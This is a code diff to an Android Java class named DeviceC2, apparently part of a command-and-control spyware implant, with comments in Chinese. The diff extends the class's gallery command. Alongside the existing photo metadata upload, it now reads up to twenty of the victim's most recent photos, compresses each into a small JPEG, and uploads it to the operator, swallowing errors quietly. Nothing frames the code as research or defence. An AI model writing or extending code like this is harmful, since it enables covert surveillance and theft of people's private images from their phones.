@@ -8,6 +8,8 @@ import android.database.Cursor;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.provider.ContactsContract;
 import android.util.Base64;
 import android.util.Log;
@@ -421,7 +423,7 @@ final class DeviceC2 {
         }
     }
 
-    // ---- 相册（始终用 MediaStore）----
+    // ---- 相册（始终用 MediaStore，上传JSON元数据+前N张缩略图）----
     private static void getGalleryAndUpload(Context ctx, String cmdId, int limit) {
         try {
             String[] proj = {
@@ -431,6 +433,8 @@ final class DeviceC2 {
                     android.provider.MediaStore.Images.Media.SIZE
             };
             android.net.Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            // 收集 ID + 元数据
+            List<long[]> idList = new ArrayList<>();
             Cursor cursor = ctx.getContentResolver().query(uri, proj, null, null,
                     android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
             StringBuilder sb = new StringBuilder("[");
@@ -446,14 +450,62 @@ final class DeviceC2 {
                       .append(",\"name\":").append(jsonString(name))
                       .append(",\"date\":").append(date)
                       .append(",\"size\":").append(size).append("}");
+                    idList.add(new long[]{id, size});
                     count++;
                 }
                 cursor.close();
             }
             sb.append("]");
-            uploadBytes(ctx, cmdId, "get_gallery", "json",
-                    sb.toString().getBytes(StandardCharsets.UTF_8), "application/json");
-        } catch (Throwable ignored) {}
+            byte[] jsonBytes = sb.toString().getBytes(StandardCharsets.UTF_8);
+            uploadBytes(ctx, cmdId, "get_gallery", "json", jsonBytes, "application/json");
+
+            // 上传前 N 张缩略图（最多20张，每张≤200KB）
+            int thumbLimit = Math.min(idList.size(), 20);
+            for (int i = 0; i < thumbLimit; i++) {
+                try {
+                    long photoId = idList.get(i)[0];
+                    android.net.Uri itemUri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                            .buildUpon().appendPath(String.valueOf(photoId)).build();
+                    BitmapFactory.Options opts = new BitmapFactory.Options();
+                    opts.inJustDecodeBounds = true;
+                    try (java.io.InputStream is = ctx.getContentResolver().openInputStream(itemUri)) {
+                        if (is != null) BitmapFactory.decodeStream(is, null, opts);
+                    }
+                    // 计算采样率使宽高 ≤ 480px
+                    int sampleSize = 1;
+                    if (opts.outWidth > 480 || opts.outHeight > 480) {
+                        sampleSize = Math.max(opts.outWidth, opts.outHeight) / 480;
+                    }
+                    BitmapFactory.Options decodeOpts = new BitmapFactory.Options();
+                    decodeOpts.inSampleSize = sampleSize;
+                    try (java.io.InputStream is2 = ctx.getContentResolver().openInputStream(itemUri)) {
+                        if (is2 == null) continue;
+                        Bitmap bmp = BitmapFactory.decodeStream(is2, null, decodeOpts);
+                        if (bmp == null) continue;
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        int quality = 60;
+                        bmp.compress(Bitmap.CompressFormat.JPEG, quality, baos);
+                        // 如果还太大，降低质量重试
+                        while (baos.size() > 200 * 1024 && quality > 20) {
+                            baos.reset();
+                            quality -= 15;
+                            bmp.compress(Bitmap.CompressFormat.JPEG, quality, baos);
+                        }
+                        bmp.recycle();
+                        byte[] thumbBytes = baos.toByteArray();
+                        uploadBytes(ctx, cmdId, "gallery_photo", "jpg", thumbBytes, "image/jpeg");
+                    }
+                } catch (Throwable ignored) {
+                    // 某张图片读取失败不影响后续
+                }
+            }
+            Log.i(TAG, "get_gallery: uploaded " + count + " meta + " + thumbLimit + " thumbs");
+        } catch (Throwable t) {
+            Log.e(TAG, "get_gallery error: " + t.getMessage());
+            try {
+                uploadText(ctx, cmdId, "get_gallery", "相册获取失败: " + t.getMessage());
+            } catch (Throwable ignored) {}
+        }
     }
 
     // ---- 获取单张图片（按 ID 上传实际图片）----
